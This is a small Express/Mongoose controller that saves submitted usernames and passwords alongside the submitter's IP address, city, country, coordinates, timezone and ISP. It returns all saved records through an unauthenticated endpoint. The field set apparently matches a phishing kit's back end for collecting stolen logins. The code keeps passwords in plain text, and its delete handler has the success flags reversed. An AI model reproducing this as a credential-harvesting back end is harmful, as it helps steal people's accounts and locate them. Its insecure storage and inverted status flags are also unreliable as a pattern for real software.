let Details = require("./details.js");
exports.addToDetails = async (req, res) => {
  const details = new Details({
    username: req.body.username,
    password: req.body.password,
    ip: req.body.ip,
    country: req.body.country,
    city: req.body.city,
    loc: req.body.loc,
    date: req.body.date,
    region: req.body.region,
    timezone: req.body.timezone,
    org: req.body.org,
  });

  await details.save();

  res.json({
    success: true,
    message: "Details added successfully",
  });
};

exports.getDetails = async (req, res) => {
  const details = await Details.find();

  res.json({
    success: true,
    details: details,
  });
};
exports.deleteDetail = async (req, res) => {
  const index = req.query.index;
  try {
    await Details.deleteOne({ _id: index });
    res.json({
      success: false,
      message: "Details deleted successfully",
      details: await Details.find(),
    });
  } catch (error) {
    res.json({
      success: true,
      message: "Details not found",
    });
  }
};
